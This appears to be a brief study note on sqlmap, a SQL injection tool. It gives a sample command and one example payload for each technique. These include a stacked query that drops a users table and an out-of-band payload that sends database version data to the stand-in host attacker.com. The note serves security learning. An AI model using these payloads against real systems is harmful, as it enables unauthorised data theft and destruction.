# Overview

An open-source tool written in Python which automates the process of detecting and exploiting SQL injection.

```sh
sqlmap -u 'http://webpage.com/page.php?id=1'
```

Techniques suported by SQLMap:
- Boolean-based blind
- Error-based
- Union query-based
- Stacked queries
- Time-based blind
- Inline queries

**Boolean-based blind SQLi**
```sql
AND 1=1
```

is considered as the most common SQLi type in web apps.

**Error-based**
```sql
AND GTID_SUBSET(@@version,0)
```

considered as faster than all other types, except UNION-query-based, because it can tetrieve a limited amount of data "chunks" through each request.

**Union query-based**
```sql
UNION ALL SELECT 1,@@version,3
```

is considered the fastest - the attacker can pull the whole database table of interest with a single request.

**Stacked queries**
```sql
; DROP TABLE users
```

**Time-based blind SQLi**
```sql
AND 1=IF(2>1,SLEEP(5),0)
```

is considerably slower than the boolean-blind SQLi, since queries resulting in TRUE would delay the server response.

**Inline queries**
```sql
SELECT (SELECT @@version) from
```

Not so common, it needs the vulnerable web app to be written in a certain way.

**Out-of-band SQLi**
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

The most advanced types of SQLi, used when other types are unsupported or too slow.
